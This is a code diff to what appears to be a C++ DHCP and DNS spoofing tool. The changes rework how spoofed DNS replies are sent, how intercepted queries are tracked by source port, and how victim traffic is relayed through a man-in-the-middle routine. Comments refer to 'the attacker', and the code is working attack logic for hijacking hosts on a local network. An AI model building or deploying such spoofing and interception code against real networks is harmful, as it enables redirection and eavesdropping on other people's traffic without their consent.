@@ -113,15 +113,15 @@ int sendACKPacket(char* raw_packet, DHCP_header& rDHCP, IP_header& rIP, pcap_t* 
 	return 0;
 }
 
-int sendDNSResponse(char* raw_packet, char* qDNS, pcap_t* sock, std::map<uint16_t, uint32_t> portForwarding, AddressInfo& info)
+int sendDNSResponse(char* raw_packet, char* qDNS, pcap_t* sock, AddressInfo& info)
 {
+	bool mitm = false;
 	size_t  tSize = createDNSResponsePacket(raw_packet, qDNS, info); // Creating the DNS response packet and 
 																	// returning the size of the packet
 	if (tSize == -1) /* Chcking for an impossible size, that means the packet has to be sent to a real DNS server*/
 	{
-		//return 0; // no MITM for now
-		portForwarding.insert(std::pair< uint16_t, uint32_t>(((UDP_header*)&qDNS[sizeof(IP_header)])->src_port, ((IP_header*)qDNS)->ip_srcaddr));
 		tSize = dnsMITM(qDNS, (uint8_t*)raw_packet, info);
+		mitm = true; // declering mitm happened
 	}
 	if(pcap_sendpacket(
 		sock,
@@ -132,6 +132,8 @@ int sendDNSResponse(char* raw_packet, char* qDNS, pcap_t* sock, std::map<uint16_
 		std::cout << "error " << pcap_geterr(sock) << std::endl;
 		return 1;
 	}
+	if (mitm)
+		return 2;
 	return 0;
 }
 
@@ -173,6 +175,8 @@ DWORD WINAPI startSpoofing(LPVOID info)
 	int in;
 	int error;
 	bool responseError = false;
+	int mitm;
+	uint8_t destMac[6];
 
 	DHCP_header pDHCP{};
 	UDP_header pUDP{};
@@ -242,30 +246,41 @@ DWORD WINAPI startSpoofing(LPVOID info)
 		if (checkForDHCP(pDHCP)) // Checks for the marking of a DHCP header
 			if (getDHCPtype(pDHCP) == 3) // Checks for a request packet
 				responseError = sendACKPacket(response_packet, pDHCP, pIP, sock,(*(AddressInfo*)(info)));
+		
 		if (pUDP.dst_port == htons(53)) // Checks for a DNS packet
 			if (pIP.ip_srcaddr != inet_addr((char*)((AddressInfo*)info)->ipv4)) // Checks the packet wasnt sent by the attacker
-				responseError = sendDNSResponse(response_packet, raw_packet, sock, portTable, (*(AddressInfo*)(info)));
-		if (portTable.find(htons(pUDP.dst_port)) != portTable.end())
+			{
+				mitm = sendDNSResponse(response_packet, raw_packet, sock, (*(AddressInfo*)(info)));
+				if (mitm == 2)
+				{
+					portTable.insert(std::pair<uint16_t, uint32_t>(pUDP.src_port, pIP.ip_srcaddr));
+					responseError = 0;
+				}
+				else if (mitm == 1)
+					responseError = 1;
+			}
+		if (portTable.find(pUDP.dst_port) != portTable.end())
 		{
+			memcpy(destMac, getARPinformation(portTable.find(pUDP.dst_port)->second), 6);
 			int size = manInTheMiddle(
-					response_packet,
-					(uint8_t*)raw_packet,
-					getARPinformation(portTable.find(htons(pUDP.dst_port))->second),
-					pUDP.dst_port,
-					portTable.find(htons(pUDP.dst_port))->second,
+					raw_packet,
+					(uint8_t*)response_packet,
+					destMac,
+					htons(pUDP.dst_port),
+					portTable.find(pUDP.dst_port)->second,
 					(*(AddressInfo*)info)
 				);
 
-			if (!pcap_sendpacket(
+			if (pcap_sendpacket(
 				sock,
 				(u_char*)response_packet,
 				size
-			))
+			) != 0)
 			{
 				std::cout << "error " << pcap_geterr(sock) << std::endl;
 				responseError = 1;
 			}
-			portTable.erase(htons(pUDP.dst_port));
+			portTable.erase(pUDP.dst_port);
 
 		}
 	}
